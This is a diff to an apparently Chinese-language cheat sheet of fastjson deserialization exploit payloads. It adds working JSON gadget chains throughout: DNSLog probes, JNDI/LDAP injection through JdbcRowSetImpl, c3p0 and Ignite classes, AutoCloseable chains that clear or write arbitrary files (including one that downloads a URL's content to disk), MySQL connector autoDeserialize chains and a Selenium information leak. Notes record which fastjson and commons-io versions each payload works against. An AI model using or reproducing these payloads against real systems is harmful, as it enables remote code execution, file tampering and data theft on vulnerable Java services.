@@ -9,17 +9,15 @@
 
 {"rand4":{"@type":"java.net.InetSocketAddress"{"address":,"val":"http://dnslog"}}}
 
-{"rand5":{"@type":"java.net.URL","val":"http://dnslog"}}
+{"rand5":{"@type":"java.net.URL","val":"http://dnslog"}} //1.2.68失败
 
 
 一些畸形payload，不过依然可以触发dnslog：
-{"rand6":{"@type":"com.alibaba.fastjson.JSONObject", {"@type": "java.net.URL", "val":"http://dnslog"}}""}}
+{"rand6":{"@type":"com.alibaba.fastjson.JSONObject", {"@type": "java.net.URL", "val":"http://dnslog"}}""}}//URL换为Inet4Address成功
 
-{"rand7":Set[{"@type":"java.net.URL","val":"http://dnslog"}]}
+{"rand7":Set[{"@type":"java.net.Inet4Address","val":"http://dnslog"}]}
 
-{"rand8":Set[{"@type":"java.net.URL","val":"http://dnslog"}
-
-{"rand9":{"@type":"java.net.URL","val":"http://dnslog"}:0
+{"rand8":Set[{"@type":"java.net.Inet4Address","val":"http://dnslog"}
 ```
 
 #### payload
@@ -32,6 +30,7 @@ JdbcRowSetImpl
     "dataSourceName": "ldap://127.0.0.1:23457/Command8",
     "autoCommit": true
 }
+
 TemplatesImpl
 
 {
@@ -88,7 +87,7 @@ JndiRefForwardingDataSource
 {
     "@type": "com.mchange.v2.c3p0.JndiRefForwardingDataSource",
     "jndiName": "ldap://127.0.0.1:23457/Command8",
-    "loginTimeout": 0
+    "loginTimeout": 0 
   }
 InetAddress
 
@@ -207,6 +206,15 @@ CacheJndiTmLookup
 	"@type": "org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup",
 	"jndiNames": "ldap://127.0.0.1:23457/Command8"
 }
+AutoCloseable RCE fastjson 1.2.50
+
+{
+    "@type":"java.lang.AutoCloseable",
+    "@type":"oracle.jdbc.rowset.OracleJDBCRowSet",
+    "dataSourceName":"ldap://localhost:1389/test",
+    "command":"a"
+}
+
 AutoCloseable 清空指定文件
 
 {
@@ -254,6 +262,92 @@ AutoCloseable 任意文件写入
         }
     }
 }
+
+{
+    'stream':
+    {
+        '@type':"java.lang.AutoCloseable",
+        '@type':'org.apache.tools.ant.util.LazyFileOutputStream',
+        'file':'/tmp/nonexist',
+        'append':false
+    },
+    'writer':
+    {
+        '@type':"java.lang.AutoCloseable",
+        '@type':'org.apache.solr.common.util.FastOutputStream',
+        'tempBuffer':'SSBqdXN0IHdhbnQgdG8gcHJvdmUgdGhhdCBJIGNhbiBkbyBpdC4=',
+        'sink':
+        {
+            '$ref':'$.stream'
+        },
+        'start':38
+    },
+    'close':
+    {
+        '@type':"java.lang.AutoCloseable",
+        '@type':'org.iq80.snappy.SnappyOutputStream',
+        'out':
+        {
+            '$ref':'$.writer'
+        }
+    }
+}
+
+{
+    '@type':"java.lang.AutoCloseable",
+    '@type':'sun.rmi.server.MarshalOutputStream',
+    'out':
+    {
+        '@type':'java.util.zip.InflaterOutputStream',
+        'out':
+        {
+           '@type':'java.io.FileOutputStream',
+           'file':'/tmp/fj_hack_jdk11',
+           'append':false
+        },
+        'infl':
+        {
+            'input':
+            {
+                'array':'eJzzSK1USMqv1FHwVEjMVQjKT8oPSS3KAABRJwdZ',
+                'limit':30
+            }
+        },
+        'bufLen':1048576
+    },
+    'protocolVersion':1
+}
+AutoCloseable 依赖文件x
+
+{
+    'stream':
+    {
+        '@type':"java.lang.AutoCloseable",
+        '@type':'org.eclipse.core.internal.localstore.SafeFileOutputStream',
+        'targetPath':'/tmp/dst',
+        'tempPath':'/tmp/src'
+    },
+    'writer':
+    {
+        '@type':"java.lang.AutoCloseable",
+        '@type':'com.esotericsoftware.kryo.io.Output',
+        'buffer':'aGFja2VkIGJ5IG0wMWUu',
+        'outputStream':
+        {
+            '$ref':'$.stream'
+        },
+        'position':15
+    },
+    'close':
+    {
+        '@type':"java.lang.AutoCloseable",
+        '@type':'com.sleepycat.bind.serial.SerialOutput',
+        'out':
+        {
+            '$ref':'$.writer'
+        }
+    }
+}
 AutoCloseable MarshalOutputStream 任意文件写入
 
 {
@@ -276,6 +370,229 @@ AutoCloseable MarshalOutputStream 任意文件写入
 	},
 	'protocolVersion': 1
 }
+AutoCloseable 依赖commons-io 2.0 - 2.6
+    
+{
+  "x":{
+    "@type":"com.alibaba.fastjson.JSONObject",
+    "input":{
+      "@type":"java.lang.AutoCloseable",
+      "@type":"org.apache.commons.io.input.ReaderInputStream",
+      "reader":{
+        "@type":"org.apache.commons.io.input.CharSequenceReader",
+        "charSequence":{"@type":"java.lang.String""aaaaaa...(长度要大于8192，实际写入前8192个字符)"
+      },
+      "charsetName":"UTF-8",
+      "bufferSize":1024
+    },
+    "branch":{
+      "@type":"java.lang.AutoCloseable",
+      "@type":"org.apache.commons.io.output.WriterOutputStream",
+      "writer":{
+        "@type":"org.apache.commons.io.output.FileWriterWithEncoding",
+        "file":"/tmp/pwned",
+        "encoding":"UTF-8",
+        "append": false
+      },
+      "charsetName":"UTF-8",
+      "bufferSize": 1024,
+      "writeImmediately": true
+    },
+    "trigger":{
+      "@type":"java.lang.AutoCloseable",
+      "@type":"org.apache.commons.io.input.XmlStreamReader",
+      "is":{
+        "@type":"org.apache.commons.io.input.TeeInputStream",
+        "input":{
+          "$ref":"$.input"
+        },
+        "branch":{
+          "$ref":"$.branch"
+        },
+        "closeBranch": true
+      },
+      "httpContentType":"text/xml",
+      "lenient":false,
+      "defaultEncoding":"UTF-8"
+    },
+    "trigger2":{
+      "@type":"java.lang.AutoCloseable",
+      "@type":"org.apache.commons.io.input.XmlStreamReader",
+      "is":{
+        "@type":"org.apache.commons.io.input.TeeInputStream",
+        "input":{
+          "$ref":"$.input"
+        },
+        "branch":{
+          "$ref":"$.branch"
+        },
+        "closeBranch": true
+      },
+      "httpContentType":"text/xml",
+      "lenient":false,
+      "defaultEncoding":"UTF-8"
+    },
+    "trigger3":{
+      "@type":"java.lang.AutoCloseable",
+      "@type":"org.apache.commons.io.input.XmlStreamReader",
+      "is":{
+        "@type":"org.apache.commons.io.input.TeeInputStream",
+        "input":{
+          "$ref":"$.input"
+        },
+        "branch":{
+          "$ref":"$.branch"
+        },
+        "closeBranch": true
+      },
+      "httpContentType":"text/xml",
+      "lenient":false,
+      "defaultEncoding":"UTF-8"
+    }
+  }
+}
+AutoCloseable 依赖commons-io 2.7 - 2.8.0 
+{
+  "x":{
+    "@type":"com.alibaba.fastjson.JSONObject",
+    "input":{
+      "@type":"java.lang.AutoCloseable",
+      "@type":"org.apache.commons.io.input.ReaderInputStream",
+      "reader":{
+        "@type":"org.apache.commons.io.input.CharSequenceReader",
+        "charSequence":{"@type":"java.lang.String""aaaaaa...(长度要大于8192，实际写入前8192个字符)",
+        "start":0,
+        "end":2147483647
+      },
+      "charsetName":"UTF-8",
+      "bufferSize":1024
+    },
+    "branch":{
+      "@type":"java.lang.AutoCloseable",
+      "@type":"org.apache.commons.io.output.WriterOutputStream",
+      "writer":{
+        "@type":"org.apache.commons.io.output.FileWriterWithEncoding",
+        "file":"/tmp/pwned",
+        "charsetName":"UTF-8",
+        "append": false
+      },
+      "charsetName":"UTF-8",
+      "bufferSize": 1024,
+      "writeImmediately": true
+    },
+    "trigger":{
+      "@type":"java.lang.AutoCloseable",
+      "@type":"org.apache.commons.io.input.XmlStreamReader",
+      "inputStream":{
+        "@type":"org.apache.commons.io.input.TeeInputStream",
+        "input":{
+          "$ref":"$.input"
+        },
+        "branch":{
+          "$ref":"$.branch"
+        },
+        "closeBranch": true
+      },
+      "httpContentType":"text/xml",
+      "lenient":false,
+      "defaultEncoding":"UTF-8"
+    },
+    "trigger2":{
+      "@type":"java.lang.AutoCloseable",
+      "@type":"org.apache.commons.io.input.XmlStreamReader",
+      "inputStream":{
+        "@type":"org.apache.commons.io.input.TeeInputStream",
+        "input":{
+          "$ref":"$.input"
+        },
+        "branch":{
+          "$ref":"$.branch"
+        },
+        "closeBranch": true
+      },
+      "httpContentType":"text/xml",
+      "lenient":false,
+      "defaultEncoding":"UTF-8"
+    },
+    "trigger3":{
+      "@type":"java.lang.AutoCloseable",
+      "@type":"org.apache.commons.io.input.XmlStreamReader",
+      "inputStream":{
+        "@type":"org.apache.commons.io.input.TeeInputStream",
+        "input":{
+          "$ref":"$.input"
+        },
+        "branch":{
+          "$ref":"$.branch"
+        },
+        "closeBranch": true
+      },
+      "httpContentType":"text/xml",
+      "lenient":false,
+      "defaultEncoding":"UTF-8"
+    }
+  }
+//fastjson<=1.2.68 commons-io 2.0-2.6 commons-io ⼤于2.6时改⼏个参数名就⾏了
+{
+ "x":{
+ "@type":"com.alibaba.fastjson.JSONObject",
+ "input":{
+ "@type":"java.lang.AutoCloseable",
+ "@type":"org.apache.commons.io.input.ReaderInputStream",
+ "reader":{
+ "@type":"jdk.nashorn.api.scripting.URLReader",
+ "url":"http://127.0.0.1:8083/test.txt"
+ },
+ "charsetName":"UTF-8",
+ "bufferSize":10000
+ },
+ "branch":{
+ "@type":"java.lang.AutoCloseable",
+ "@type":"org.apache.commons.io.output.WriterOutputStream",
+ "writer":{
+ "@type":"org.apache.commons.io.output.FileWriterWithEncoding",
+ "file":"/tmp/files/12345",
+ "encoding":"UTF-8",
+ "append": true
+ },
+ "charset":"UTF-8",
+ "bufferSize": 8193,
+ "writeImmediately": true
+ },
+ "trigger":{
+ "@type":"java.lang.AutoCloseable",
+ "@type":"org.apache.commons.io.input.XmlStreamReader",
+ "is":{
+ "@type":"org.apache.commons.io.input.TeeInputStream",
+ "input":{
+ "$ref":"$.input"
+ },
+ "branch":{
+ "$ref":"$.branch"
+ },
+ "closeBranch": true
+ },
+ "httpContentType":"text/xml",
+ "lenient":false,
+ "defaultEncoding":"UTF-8"
+ }
+ }
+}
+      
+Mysqlconnector 5.1.x  {"@type":"java.lang.AutoCloseable","@type":"com.mysql.jdbc.JDBC4Connection","hostToConnectTo":"mysql.host","portToConnectTo":3306,"info":{"user":”user","password":"pass","statementInterceptors":"com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor","autoDeserialize":"true","NUM_HOSTS": "1"},"databaseToConnectTo":"dbname","url":""}
+
+Mysqlconnector 6.0.2 or 6.0.3
+{"@type": "java.lang.AutoCloseable","@type": "com.mysql.cj.jdbc.ha.LoadBalancedMySQLConnection","proxy":{"connectionString":{"url": "jdbc:mysql://localhost:3306/foo?allowLoadLocalInfile=true"}}}
+
+Mysqlconnector 6.x or < 8.0.20
+{"@type":"java.lang.AutoCloseable","@type":"com.mysql.cj.jdbc.ha.ReplicationMySQLConnection","proxy":{"@type":"com.mysql.cj.jdbc.ha.LoadBalancedConnectionProxy","connectionUrl":{"@type":"com.mysql.cj.conf.url.ReplicationConnectionUrl", "masters": [{"host":"mysql.host"}], "slaves":[], "properties":{"host":"mysql.host","user":"user","dbname":"dbname","password":"pass","queryInterceptors":"com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor","autoDeserialize":"true"}}}}
+
+{"x":
+  {"@type":"java.lang.Exception",
+  "@type":"org.openqa.selenium.WebDriverException"},
+ "y":{"$ref":"$x.systemInformation"}
+}
+
 BasicDataSource
 
 {
